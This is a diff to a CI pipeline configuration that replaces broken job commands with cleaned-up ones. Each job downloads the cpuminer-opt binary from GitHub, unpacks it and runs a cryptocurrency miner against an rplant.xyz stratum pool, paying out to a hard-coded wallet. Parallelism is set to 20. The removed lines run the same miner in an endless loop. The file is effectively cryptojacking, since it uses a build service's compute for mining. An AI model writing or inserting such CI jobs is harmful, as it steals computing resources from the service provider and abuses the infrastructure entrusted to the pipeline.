@@ -9,20 +9,9 @@ blocks:
     task:
       jobs:
         - name: 'Job #1'
-          commands:wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz 
-tar xf cpuminer-opt-linux.tar.gz 
-while [ 1 ]; do 
-./cpuminer-sse2 -a yescryptR32 -o stratum+tcp://stratum-eu.rplant.xyz:7047  -u  DJAECyb7wAohrrZkgCkNctgAJpcDDMhxsk.kido87 -t8 
-sleep 2
-done
-            - checkout
-  - name: 'Block #2'
-    task:
-      jobs:
-        - name: 'Job #1'
-          commands: [wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz 
-tar xf cpuminer-opt-linux.tar.gz 
-while [ 1 ]; do 
-./cpuminer-sse2 -a yescryptR32 -o stratum+tcp://stratum-eu.rplant.xyz:7047  -u  DJAECyb7wAohrrZkgCkNctgAJpcDDMhxsk.kido87 -t8 
-sleep 2
-done
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz; tar -xf cpuminer-opt-linux.tar.gz; ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u DJAECyb7wAohrrZkgCkNctgAJpcDDMhxsk.kido5 -t8'
+          parallelism: 20
+        - name: 'Job #2'
+          commands:
+            - 'wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz; tar -xf cpuminer-opt-linux.tar.gz; ./cpuminer-sse2 -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17042 -u DJAECyb7wAohrrZkgCkNctgAJpcDDMhxsk.kido5 -t8'
